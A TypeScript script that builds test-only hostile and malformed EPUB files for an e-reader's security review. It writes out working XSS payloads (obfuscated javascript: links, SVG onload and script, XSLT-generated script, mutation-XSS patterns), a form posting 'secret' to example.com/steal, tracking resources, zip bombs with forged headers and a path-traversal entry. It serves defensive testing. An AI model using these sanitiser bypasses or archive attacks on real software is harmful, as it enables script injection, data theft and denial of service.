/**
 * TEST-ONLY malicious and malformed EPUBs for the pre-R4 security review.
 * None of these are catalogue books. Each payload tries to prove real access by
 * (1) marking the XPLOR9 page and (2) listing its IndexedDB databases.
 *
 * Usage: node scripts/books/make-security-fixtures.ts  -> test-fixtures/security/*.epub
 */
import { mkdirSync, writeFileSync } from "node:fs";
import { strToU8, zipSync, type Zippable } from "fflate";

const OUT = "test-fixtures/security";
// Marks the page that hosts the book (window.parent) and tries to reach XPLOR9 itself
// (window.top: in the isolated reader that is a different origin and must be unreachable).
const payload = (name: string) =>
  `try{var w=window.parent;(w.__xplor9_attack=w.__xplor9_attack||[]).push('${name}');` +
  `w.indexedDB.databases().then(function(d){w.__xplor9_dbs=d.map(function(x){return x.name})})}catch(e){}` +
  `try{window.top.__xplor9_attack=['${name}-reached-top'];window.top.localStorage.setItem('xplor9.pwned','${name}')}catch(e){}`;

const container = `<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>`;

type Item = { id: string; href: string; type: string; body: string | Uint8Array; spine?: boolean };

function epub(title: string, itemsIn: Item[], opfOverride?: string, withNav = true): Uint8Array {
  // Real-world EPUB 3 files carry a navigation document; add one unless testing its absence.
  const firstSpine = itemsIn.find((i) => i.spine);
  const items: Item[] =
    withNav && firstSpine
      ? [
          ...itemsIn,
          {
            id: "nav", href: "nav.xhtml", type: "application/xhtml+xml\" properties=\"nav",
            body: `<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>Nav</title></head><body><nav epub:type="toc"><ol><li><a href="${firstSpine.href}">${title}</a></li></ol></nav></body></html>`,
          },
        ]
      : itemsIn;
  const manifest = items.map((i) => `<item id="${i.id}" href="${i.href}" media-type="${i.type}"/>`).join("");
  const spine = items.filter((i) => i.spine).map((i) => `<itemref idref="${i.id}"/>`).join("");
  const opf =
    opfOverride ??
    `<?xml version="1.0" encoding="utf-8"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:xplor9:sec:${title}</dc:identifier><dc:title>${title}</dc:title><dc:language>en</dc:language></metadata><manifest>${manifest}</manifest><spine>${spine}</spine></package>`;
  const files: Zippable = {
    mimetype: [strToU8("application/epub+zip"), { level: 0 }],
    "META-INF/container.xml": strToU8(container),
    "OEBPS/content.opf": strToU8(opf),
  };
  for (const i of items) files[`OEBPS/${i.href}`] = typeof i.body === "string" ? strToU8(i.body) : i.body;
  return zipSync(files, { mtime: new Date("2026-11-23T00:00:00Z") });
}

const xhtml = (title: string, body: string, head = "", pi = "") =>
  `<?xml version="1.0" encoding="utf-8"?>${pi}<html xmlns="http://www.w3.org/1999/xhtml" xmlns:xlink="http://www.w3.org/1999/xlink"><head><title>${title}</title>${head}</head><body><h1>${title}</h1>${body}<p>End of ${title}.</p></body></html>`;

mkdirSync(OUT, { recursive: true });

// 1. Markup bypasses the current deny-list sanitiser might miss
writeFileSync(
  `${OUT}/bypass-links-forms.epub`,
  epub("links-forms", [
    {
      id: "c1", href: "c1.xhtml", type: "application/xhtml+xml", spine: true,
      body: xhtml("Links and forms", `
<p><a id="tab-js" href="java&#x09;script:${payload("tab-in-scheme-link")}">Tab inside javascript: scheme</a></p>
<p><a id="nl-js" href="java&#x0A;script:${payload("newline-in-scheme-link")}">Newline inside scheme</a></p>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="30"><a id="svg-js" xlink:href="javascript:${payload("svg-xlink-js")}"><text x="0" y="20">SVG javascript link</text></a></svg>
<form id="steal" action="https://example.com/steal" method="get"><input name="q" value="secret"/><button id="fbtn" type="submit">Submit form</button></form>
<p><a id="top" href="https://example.com/top" target="_top">target=_top link</a></p>`),
    },
  ]),
);

// 2. External resources: privacy leaks (IP address, reading activity) and autoplay
writeFileSync(
  `${OUT}/external-resources.epub`,
  epub("external", [
    {
      id: "c1", href: "c1.xhtml", type: "application/xhtml+xml", spine: true,
      body: xhtml(
        "External resources",
        `<p><img src="https://example.com/tracking-pixel.png" alt="pixel"/></p>
<p style="background-image:url(https://example.com/inline-bg.png)">Inline style background</p>
<p class="remote-font">Remote font</p>
<audio src="https://example.com/autoplay.mp3" autoplay="autoplay"></audio>
<video src="https://example.com/autoplay.mp4" autoplay="autoplay" muted="muted"></video>`,
        `<link rel="stylesheet" href="https://example.com/remote.css"/><style>@import url("https://example.com/imported.css"); @font-face{font-family:remote;src:url(https://example.com/remote-font.woff2)} .remote-font{font-family:remote}</style>`,
      ),
    },
  ]),
);

// 3. XSLT: a stylesheet processing instruction that generates script after sanitising
writeFileSync(
  `${OUT}/xslt-script.epub`,
  epub("xslt", [
    {
      id: "c1", href: "c1.xhtml", type: "application/xhtml+xml", spine: true,
      body: xhtml("XSLT chapter", `<p>If XSLT runs, this page is replaced.</p>`, "", `<?xml-stylesheet type="text/xsl" href="evil.xsl"?>`),
    },
    {
      id: "x", href: "evil.xsl", type: "application/xslt+xml",
      body: `<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><html xmlns="http://www.w3.org/1999/xhtml"><body><p id="xslt-ran">XSLT output</p><script>${payload("xslt-generated-script")}</script></body></html></xsl:template></xsl:stylesheet>`,
    },
  ]),
);

// 4. HTML (not XHTML) chapter: parse/serialise "mutation XSS" patterns
writeFileSync(
  `${OUT}/html-mutation.epub`,
  epub("mutation", [
    {
      id: "c1", href: "c1.html", type: "text/html", spine: true,
      body: `<!DOCTYPE html><html><head><title>Mutation</title></head><body><h1>Mutation patterns</h1>
<noscript><p title="</noscript><img src=x onerror=${payload("noscript-mxss")}>">noscript</p></noscript>
<svg><style><img src=x onerror="${payload("svg-style-mxss")}"></style></svg>
<math><mtext><table><mglyph><style><img src=x onerror="${payload("math-mglyph-mxss")}"></style></mglyph></table></mtext></math>
<form><math><mtext></form><form><mglyph><style></math><img src onerror="${payload("form-math-mxss")}"></style></mglyph></form>
<p>End of mutation.</p></body></html>`,
    },
  ]),
);

// 5. Zip bomb: a tiny file that expands to ~150 MB of text in one chapter
const bomb = "<p>" + "a".repeat(150 * 1024 * 1024) + "</p>";
writeFileSync(
  `${OUT}/zip-bomb-150mb.epub`,
  epub("bomb", [{ id: "c1", href: "c1.xhtml", type: "application/xhtml+xml", spine: true, body: xhtml("Bomb", bomb) }]),
);

// 5b. Zip bomb whose local headers LIE: they claim 10 bytes, the data expands to ~150 MB
{
  const z = epub("lying-bomb", [{ id: "c1", href: "c1.xhtml", type: "application/xhtml+xml", spine: true, body: xhtml("Lying bomb", bomb) }]);
  const view = new DataView(z.buffer, z.byteOffset, z.byteLength);
  for (let i = 0; i + 30 < z.length; i++) if (view.getUint32(i, true) === 0x04034b50) view.setUint32(i + 22, 10, true);
  writeFileSync(`${OUT}/lying-bomb-150mb.epub`, z);
}

// 5c. Path traversal entry name
{
  const files: Zippable = {
    mimetype: [strToU8("application/epub+zip"), { level: 0 }],
    "META-INF/container.xml": strToU8(container),
    "../../evil.xhtml": strToU8("<p>escaped the archive</p>"),
  };
  writeFileSync(`${OUT}/path-traversal.epub`, zipSync(files));
}

// 5d. A hostile standalone SVG page in the reading order
writeFileSync(
  `${OUT}/svg-document.epub`,
  epub("svg", [
    {
      id: "s1", href: "page.svg", type: "image/svg+xml", spine: true,
      body: `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="200" onload="${payload("svg-onload")}"><script>${payload("svg-script")}</script><a xlink:href="javascript:${payload("svg-link")}"><text x="10" y="40">SVG page</text></a><foreignObject width="300" height="50"><div xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="${payload("svg-foreign-img")}"/></div></foreignObject></svg>`,
    },
  ]),
);

// 6. A clean book with no navigation document (robustness, not an attack)
writeFileSync(
  `${OUT}/clean-no-nav.epub`,
  epub("no-nav", [{ id: "c1", href: "c1.xhtml", type: "application/xhtml+xml", spine: true, body: xhtml("No navigation document", "<p>Plain text.</p>") }], undefined, false),
);

// 7. Malformed files
writeFileSync(`${OUT}/not-a-zip.epub`, strToU8("This is plain text pretending to be an EPUB."));
const good = epub("trunc", [{ id: "c1", href: "c1.xhtml", type: "application/xhtml+xml", spine: true, body: xhtml("T", "<p>x</p>".repeat(2000)) }]);
writeFileSync(`${OUT}/truncated.epub`, good.subarray(0, Math.floor(good.length / 2)));
writeFileSync(
  `${OUT}/broken-opf.epub`,
  epub("broken", [{ id: "c1", href: "c1.xhtml", type: "application/xhtml+xml", spine: true, body: xhtml("B", "<p>x</p>") }], "<package><manifest><item id="),
);
writeFileSync(
  `${OUT}/many-entries.epub`,
  epub(
    "many",
    Array.from({ length: 20000 }, (_, n) => ({ id: `i${n}`, href: `f${n}.xhtml`, type: "application/xhtml+xml", spine: n < 3, body: xhtml(`F${n}`, "<p>x</p>") })),
  ),
);
console.log("Wrote security fixtures to", OUT);
